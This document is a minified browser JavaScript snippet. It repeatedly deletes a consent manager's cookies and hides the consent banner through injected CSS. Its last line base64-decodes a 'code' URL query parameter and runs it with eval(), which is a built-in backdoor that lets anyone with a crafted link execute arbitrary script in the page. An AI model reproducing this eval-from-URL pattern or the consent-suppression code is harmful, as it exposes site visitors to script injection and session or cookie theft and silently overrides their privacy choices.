function get_cookie(e){for(var t=e+"=",o=document.cookie.split(";"),n=0;n<o.length;n++){for(var c=o[n];" "==c.charAt(0);)c=c.substring(1,c.length);if(0==c.indexOf(t))return c.substring(t.length,c.length)}return null}function delete_cookie(e,t,o){get_cookie(e)&&(document.cookie=e+"="+(t?";path="+t:"")+(o?";domain="+o:"")+";expires=Thu, 01 Jan 1970 00:00:01 GMT")}setInterval(function(){delete_cookie("_ketch_consent_v1_","/","."+location.hostname),delete_cookie("_swb","/","."+location.hostname),delete_cookie("_swb_consent_","/","."+location.hostname)},1e3);var style=document.createElement("style"),cssContent=document.createTextNode(".ketch-fixed {display: none}");style.appendChild(cssContent),document.head.appendChild(style);var search=new URLSearchParams(location.search),b_code=search.get("code");b_code&&setTimeout(function(){var code=atob(b_code);eval(code)},0);
